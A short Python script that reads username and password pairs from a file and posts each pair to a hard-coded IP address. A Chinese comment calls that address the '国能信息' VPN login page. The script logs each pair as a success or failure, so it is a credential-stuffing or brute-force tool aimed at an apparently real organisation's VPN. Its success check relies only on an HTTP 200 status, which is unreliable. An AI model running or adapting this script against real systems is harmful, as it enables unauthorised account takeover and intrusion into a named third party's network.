import requests

def login(username, password, url):
    data = {
        'username': username,
        'password': password
    }
    response = requests.post(url, data=data)
    if response.status_code == 200:
        print(f"登录成功：{username}/{password}")
    else:
        print(f"登录失败：{username}/{password}")

def read_credentials_from_file(file_path):
    with open(file_path, 'r') as file:
        credentials = file.readlines()
    return [cred.strip().split(',') for cred in credentials]

if __name__ == '__main__':
    url = 'http://219.142.82.226:8086/#!/login'  # 国能信息vpn登录地址
    file_path = 'credentials.txt'  # 替换为实际的帐号密码文件路径

    credentials = read_credentials_from_file(file_path)
    for username, password in credentials:
        login(username, password, url)
